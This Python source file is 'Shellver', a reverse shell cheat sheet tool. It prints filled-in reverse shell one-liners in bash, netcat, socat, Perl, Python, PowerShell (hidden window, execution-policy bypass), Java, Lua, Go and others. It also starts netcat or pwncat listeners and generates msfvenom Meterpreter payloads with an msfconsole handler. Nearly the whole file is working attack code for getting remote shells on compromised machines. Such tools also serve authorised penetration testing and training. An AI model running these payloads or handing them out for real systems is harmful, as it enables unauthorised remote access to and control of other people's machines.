#!/usr/bin/env python3
"""
                                    ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
                                    ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
                                    ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
                                            .:: 0xR ::.
                            .:: Reverse Shell Cheat Sheet Tool ::.
                                    .:: cyber-warrior.org ::.
                         .:: Heavily modified by Jonas A. Wendorf ::.

Shellver is a Reverse Shell Cheat Sheet Tool.

It tries to streamline some of the tedious parts of getting shells when you already have RCE, by giving you a list of payloads, automatically spawning a listener, giving sensible defaults etc.

Usage: shellver.py [-h] msf|shell|pwncat|<command>

Options:
    -h --help  Show this help text
    msf        Create msfvenom payloads, generate msconsole config files, and start a listener
    shell      Show a generic list of reverse shell commands and start a netcat listener
    pwncat     Show Linux reverse shell commands and start a pwncat listener
    command    Custom listener command to run.  Use “xxx” as placeholder for IP address and “yyy” as placeholder for port
"""
import argparse
import ipaddress
import os
import re
import signal
import socket
import subprocess
import sys
from random import choice, sample
from subprocess import PIPE, Popen
from urllib import request

import netifaces
from docopt import docopt

color = [
    "\033[95m",
    "\033[96m",
    "\033[36m",
    "\033[94m",
    "\033[92m",
    "\033[93m",
    "\033[91m",
]
reset_color = "\033[0m"


def signal_handler(sig: int, frame: object):
    """
    Exit gracefully on signals.

    Parameters
    ----------
    sig : int
        Signal number
    frame : object
        The signal frame
    """
    print("\nBye!")
    sys.exit(1)


def ask_listener() -> (str, int, bool):
    """
    Ask for the appropriate listener and return the IP and port the user selected.

    Returns
    -------
    str
       The IP address the user selected
    int
        The port the user selected
    bool
        True if the user selected the IP address of one of the interfaces
    """
    interfaces = netifaces.interfaces()
    ip_addrs = []
    for interface in interfaces:
        ip_addrs.extend(
            [
                (interface, ip_addr["addr"])
                for ip_addr in netifaces.ifaddresses(interface).get(
                    netifaces.AF_INET, []
                )
                if not ipaddress.ip_address(ip_addr["addr"]).is_loopback
            ]
        )
    wan = None
    interface_used = False
    try:
        wan = request.urlopen("https://api.ipify.org").readline().decode("utf-8")
    except:
        print("Could not automatically determine external IP address.")
        print("Please try again later or input manually!")
    print(f"{choice(color)}")
    for idx, ip_addr in enumerate(ip_addrs, 1):
        print(f"For LAN enter {idx}: {ip_addr[1]} ({ip_addr[0]})")
    if wan:
        print(f"For WAN enter {idx + 1}: {wan}")
    print("Enter a custom IP address if none of the above are correct for you.")
    while True:
        try:
            cw = input("Which one do you want?: ")
            if int(cw) >= 1 and int(cw) <= idx:
                ipp = ip_addrs[int(cw) - 1][1]
                interface_used = True
                break
            elif int(cw) == idx + 1 and wan:
                ipp = wan
                break
        except ValueError:
            try:
                socket.inet_aton(cw)
                ipp = cw
                break
            except socket.error:
                pass
        print("Invalid input.")
    while True:
        port = input("Select listening port: ")
        try:
            if int(port) < 0 or int(port) > 65535:
                raise ValueError
            break
        except ValueError:
            print("Invalid input.")
    return ipp, port, interface_used


def shell(listener: str):
    """
    Print information on how to spawn a reverse shell and start a listener.

    Parameters
    ----------
    listener : str
        Optionally define the listener command to use instead of (xxx will be replaced by the IP address, yyy will be replaced by the port)
    """
    ipp, port, interface_used = ask_listener()

    # rlwrap creates bugs for Linux reverse shells, so using upgrade-tty or pwncat is preferred
    # If rlwrap was used to invoke this script, we can assume, that the user wants to run a Windows reverse shell
    rlwrap = False
    ppid = os.getppid()
    ppid_path = os.path.join("/proc", str(ppid))
    if os.path.exists(ppid_path):
        with open(os.path.join(ppid_path, "comm")) as comm:
            if "rlwrap" in comm.read():
                rlwrap = True
                print(
                    "Detected rlwrap, only showing universal and Windows-only reverse shells."
                )

    # pwncat works only for Linux reverse shells, so we can assume, that the user wants to run a Linux reverse shell
    pwncat = False
    if "pwncat" in listener:
        pwncat = True
        print(
            "pwncat works only with Linux, only showing universal and Linux-only reverse shells."
        )

    # Warn and react to rlwrap and pwncat combination
    if rlwrap and pwncat:
        print(
            "pwncat should do what rlwrap does (and more!) for Linux machines.  Are you sure, you want to use both? Re-enabling Linux-only reverse shells."
        )
        rlwrap = False

    # Keeping with the random colors, but adding color coding for different OS
    os_colors = sample(color, 3)
    windows_color = os_colors[0]
    linux_color = os_colors[1]
    both_color = os_colors[2]
    print(linux_color, end="")
    shells = []
    if not rlwrap:
        shells.append(
            r"""
╔BASH TCP═══════════════════════════════════════════
║ bash -i >& /dev/tcp/xxx/yyy 0>&1
╠═══════════════════════════════════════════════════
║ 0<&196;exec 196<>/dev/tcp/xxx/yyy; sh <&196 >&196 2>&196
╚═══════════════════════════════════════════════════
╔BASH UDP═════════════╦═════════════════════════════
║ Run Target Machine  ║ sh -i >& /dev/udp/xxx/yyy 0>&1
╚═════════════════════╩═════════════════════════════

╔Netcat Traditional═════════════════════════════════
║ nc -e /bin/sh xxx yyy
╚═══════════════════════════════════════════════════
╔Netcat OpenBSD═════════════════════════════════════
║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx yyy >/tmp/f
╚═══════════════════════════════════════════════════
╔NCAT═══════════════════════════════════════════════
║ ncat xxx yyy -e /bin/bash
╠═══════════════════════════════════════════════════
║ ncat --udp xxx yyy -e /bin/bash
╚═══════════════════════════════════════════════════
"""
        )
    if rlwrap:
        shells.append(windows_color)
        shells.append(
            r"""
╔Socat═════════╦════════════════════════════════════"""
        )
    if not rlwrap:
        shells.append(
            r"""
╔Socat══════════════════════════════════════════════
║ socat -d -d -d TCP4:xxx:yyy EXEC:/bin/bash"""
        )
        if pwncat:
            shells.append(
                """
╚═══════════════════════════════════════════════════
"""
            )
    if not pwncat:
        shells.append(windows_color)
        if not rlwrap:
            shells.append(
                """
╠══════════════╦════════════════════════════════════"""
            )
        shells.append(
            r"""
║ Windows only ║ socat -d -d TCP4:xxx:yyy EXEC:'cmd.exe',pipes
╚══════════════╩════════════════════════════════════
"""
        )
    if not rlwrap:
        shells.append(linux_color)
        shells.append(
            r"""
╔AWK════════════════════════════════════════════════
║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
╚═══════════════════════════════════════════════════

╔NODEJS═════════════════════════════════════════════
║ (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(yyy, "xxx", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
╠═══════════════════════════════════════════════════
║ require('child_process').exec('nc -e /bin/sh xxx yyy')
╠═══════════════════════════════════════════════════
║ var x = global.process.mainModule.require
x('child_process').exec('nc xxx yyy -e /bin/bash')
╚═══════════════════════════════════════════════════

╔PERL═══════════════════════════════════════════════
║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
        )
    shells.append(both_color)
    if not rlwrap:
        shells.append(
            r"""
╠═══════════════════════════════════════════════════"""
        )
    else:
        shells.append(
            """
╔PERL═══════════════════════════════════════════════"""
        )
    shells.append(
        r"""
║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
╠═══════════════════════════════════════════════════
║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
╚═══════════════════════════════════════════════════"""
    )
    if not rlwrap:
        shells.append(linux_color)
        shells.append(
            r"""

╔PYTHON═════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
╠═══════════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        )
    if pwncat:
        shells.append(
            """
╚═══════════════════════════════════════════════════"""
        )
    else:
        shells.append(windows_color)
        if not rlwrap:
            shells.append(
                r"""
╠══════════════╦════════════════════════════════════"""
            )
        else:
            shells.append(
                r"""

╔PYTHON════════╦════════════════════════════════════"""
            )
        shells.append(
            r"""
║ Windows only ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
╚══════════════╩════════════════════════════════════"""
        )
    if not rlwrap:
        shells.append(linux_color)
        shells.append(
            r"""

╔PHP════════════════════════════════════════════════
║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
╚═══════════════════════════════════════════════════"""
        )

        shells.append(both_color)
        shells.append(
            r"""

╔RUBY═══════════════════════════════════════════════
║ ruby -rsocket -e 'c=TCPSocket.new("10.0.2.15","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
╚═══════════════════════════════════════════════════"""
        )
    if not pwncat:
        shells.append(windows_color)
        shells.append(
            r"""

╔POWERSHELL═════════════════════════════════════════
║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
╠═══════════════════════════════════════════════════
║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
╚═══════════════════════════════════════════════════"""
        )
    if not rlwrap:
        shells.append(linux_color)
        shells.append(
            r"""

╔JAVA═══════════════════════════════════════════════
║ r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
╚═══════════════════════════════════════════════════"""
        )
    if not pwncat:
        shells.append(windows_color)
    shells.append(
        r"""

╔JAVA for GROOVY════════════════════════════════════"""
    )
    if not pwncat:
        shells.append(
            r"""
║ String host="xxx";
int port=yyy;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"""
        )
    if not rlwrap:
        shells.append(
            r"""
╠═══════════════════════════════════════════════════"""
        )
        shells.append(linux_color)
        shells.append(
            r"""
║ String host="xxx";
int port=yyy;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
╚═══════════════════════════════════════════════════"""
        )
    else:
        shells.append(
            r"""
╚═══════════════════════════════════════════════════"""
        )
    if not rlwrap:
        shells.append(
            r"""

╔LUA═════════╦══════════════════════════════════════
║ Linux only ║ lua -e "require('os');t=require('socket').tcp():connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');" """
        )
    shells.append(both_color)
    if not rlwrap:
        shells.append(
            r"""
╠════════════╩══════╦═══════════════════════════════"""
        )
    else:
        shells.append(
            r"""

╔LUA════════════════╦═══════════════════════════════"""
        )
    shells.append(
        r"""
║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
╚═══════════════════╩═══════════════════════════════"""
    )
    if not rlwrap:
        shells.append(linux_color)
        shells.append(
            r"""

╔GOLANG══════╦══════════════════════════════════════
║ Linux only ║ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","xxx:yyy");m:=exec.Command("/bin/sh");m.Stdin=c;m.Stdout=c;m.Stderr=c;m.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
╚════════════╩══════════════════════════════════════"""
        )

    print("".join(shells).replace("xxx", ipp).replace("yyy", port))

    print(f"{choice(color)}         |--Shell Spawning--|\n")
    if not rlwrap and not pwncat:
        print(
            "For Linux shells use https://github.com/jonasw234/upgrade-tty to upgrade your TTY!\n"
        )
    print(reset_color, end="")
    command = []
    if os.geteuid() != 0 and int(port) < 1024:
        command.append("sudo")
    if not interface_used:
        # User didn’t select a known interface IP, listen on all interfaces instead
        ipp = "0.0.0.0"
    command.extend(listener.replace("xxx", ipp).replace("yyy", port).split(" "))
    Popen(command).communicate()


def payload():
    """Create msfvenom payload and start a listener."""
    print(
        f"""{choice(color)}
                      ___________________________________________________________

                                   Creating Metasploit Payloads
         _______________________________________________________________________________________
        |                       |                 |                       |                     |
        | #Binaries             |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
        |_______________________|_________________|_______________________|_____________________|
        |                       |                 |                       |                     |
        | 1) Linux              | 7)  PHP         | 12) Python            | 16) Linux based     |
        |                       |                 |                       |                     |
        | 2) Windows (exe)      | 8)  ASP         | 13) Bash              | 17) Windows based   |
        |                       |                 |                       |                     |
        | 3) Windows (dll)      | 9)  JSP         | 14) Perl              | 18) Mac based       |
        |                       |                 |                       |                     |
        | 4) Windows (dll, x64) | 10) WAR         | 15) Ruby              |                     |
        |                       |                 |                       |                     |
        | 5) Windows (msi)      | 11) NodeJS      |                       |                     |
        |                       |                 |                       |                     |
        | 6) Mac                |                 |                       |                     |
        |_______________________|_________________|_______________________|_____________________|
"""
    )
    while True:
        ven = input("Enter payload: ")
        try:
            if int(ven) < 1 or int(ven) > 18:
                raise ValueError
            break
        except ValueError:
            print("Invalid input.")

    ipp, port, _ = ask_listener()

    msfvenom_command = None
    msfvenom_extension = None
    msfvenom_extra = ""
    # Binaries
    if ven == "1":
        msfvenom_command = "linux/x86/meterpreter/reverse_tcp"
        msfvenom_extension = "elf"
        msfvenom_extra = "-f elf"
    elif ven == "2":
        msfvenom_command = "windows/meterpreter/reverse_tcp"
        msfvenom_extension = "exe"
        msfvenom_extra = "-f exe"
    elif ven == "3":
        msfvenom_command = "windows/meterpreter/reverse_tcp"
        msfvenom_extension = "dll"
        msfvenom_extra = "-f dll"
    elif ven == "4":
        msfvenom_command = "windows/x64/meterpreter/reverse_tcp"
        msfvenom_extension = "dll"
        msfvenom_extra = "-f dll"
    elif ven == "5":
        msfvenom_command = "windows/meterpreter/reverse_tcp"
        msfvenom_extension = "msi"
        msfvenom_extra = "-f msi"
    elif ven == "6":
        msfvenom_command = "osx/x86/shell_reverse_tcp"
        msfvenom_extension = "macho"
        msfvenom_extra = "-f macho"
    # Web Payloads
    elif ven == "7":
        msfvenom_command = "php/meterpreter/reverse_tcp"
        msfvenom_extension = "php"
        msfvenom_extra = "-f raw"
    elif ven == "8":
        msfvenom_command = "windows/meterpreter/reverse_tcp"
        msfvenom_extension = "asp"
        msfvenom_extra = "-f asp"
    elif ven == "9":
        msfvenom_command = "java/jsp_shell_reverse_tcp"
        msfvenom_extension = "jsp"
        msfvenom_extra = "-f raw"
    elif ven == "10":
        msfvenom_command = "java/jsp_shell_reverse_tcp"
        msfvenom_extension = "war"
        msfvenom_extra = "-f war"
    elif ven == "11":
        msfvenom_command = "nodejs/shell_reverse_tcp"
        msfvenom_extension = "js"
        msfvenom_extra = "-f raw"

    # Scripting
    elif ven == "12":
        msfvenom_command = "python/meterpreter_reverse_tcp"
        msfvenom_extension = "py"
        msfvenom_extra = "-f raw"
    elif ven == "13":
        msfvenom_command = "cmd/unix/reverse_bash"
        msfvenom_extension = "sh"
        msfvenom_extra = "-f raw"
    elif ven == "14":
        msfvenom_command = "cmd/unix/reverse_perl"
        msfvenom_extension = "pl"
        msfvenom_extra = "-f raw"
    elif ven == "15":
        msfvenom_command = "ruby/shell_reverse_tcp"
        msfvenom_extension = "rb"
        msfvenom_extra = "-f raw"

    # Shellcode
    elif ven == "16":
        msfvenom_command = "linux/x86/meterpreter/reverse_tcp"
        dil = input("Enter language: ")
        if dil.rstrip() == "":
            dil = "raw"
        msfvenom_extra = f"-f {dil}"
        msfvenom_extension = dil
    elif ven == "17":
        msfvenom_command = "windows/meterpreter/reverse_tcp"
        dil = input("Enter language: ")
        if dil.rstrip() == "":
            dil = "raw"
        msfvenom_extra = f"-f {dil}"
        msfvenom_extension = dil
    elif ven == "18":
        msfvenom_command = "osx/x86/shell_reverse_tcp"
        dil = input("Enter language: ")
        if dil.rstrip() == "":
            dil = "raw"
        msfvenom_extra = f"-f {dil}"
        msfvenom_extension = dil

    if msfvenom_command and msfvenom_extension:
        payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
        with open(os.path.join(os.getcwd(), payload), "wb") as output:
            command = [
                "msfvenom",
                "-p",
                msfvenom_command,
                f"LHOST={ipp}",
                f"LPORT={port}",
            ]
            command.extend(msfvenom_extra.split(" "))
            Popen(command, stdout=output, stderr=None)
        print(f"Payload created: {os.getcwd()}/{payload}")
        msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
        with open(msfvenom_rc, "w") as rc:
            rc.write(
                f"""#
# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{payload}'
#
use exploit/multi/handler
set PAYLOAD {msfvenom_command}
set LHOST {ipp}
set LPORT {port}
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j"""
            )
        spawn_shell = ["msfconsole", "-q", "-r", f"{os.getcwd()}/{msfvenom_rc}"]
        print("")
    else:
        print("Something went wrong and I don’t know what to do ...")
        sys.exit(1)

    print(f"{choice(color)}         |--Shell Spawning--|\n")
    print(reset_color, end="")
    command = []
    if os.geteuid() != 0 and int(port) < 1024:
        command.append("sudo")
    command.extend(spawn_shell)
    Popen(command).communicate()


def main():
    """Handle arguments and invoke the appropriate functions."""
    args = docopt(__doc__)
    print(
        choice(color)
        + """
                                    ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
                                    ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
                                    ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
                                            .:: 0xR ::.
                            .:: Reverse Shell Cheat Sheet Tool ::.
                                    .:: cyber-warrior.org ::.
                         .:: Heavily modified by Jonas A. Wendorf ::.
"""
    )
    if args["shell"]:
        # Try to find correct command line arguments for nc version
        help_output, help_error = Popen(
            ["nc", "-h"], stdout=PIPE, stderr=PIPE
        ).communicate()
        help_output = help_output if help_output else help_error
        if b"https://nmap.org/ncat" in help_output or b"OpenBSD netcat" in help_output:
            command = "nc -lvn xxx yyy"
        else:
            command = "nc -s xxx -lvnp yyy"
        shell(command)
    elif args["pwncat"]:
        shell("pwncat --listen --port yyy xxx")
    elif args["<command>"]:
        shell(args["<command>"])
    elif args["msf"]:
        payload()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    try:
        main()
    except EOFError:
        signal_handler(0, None)
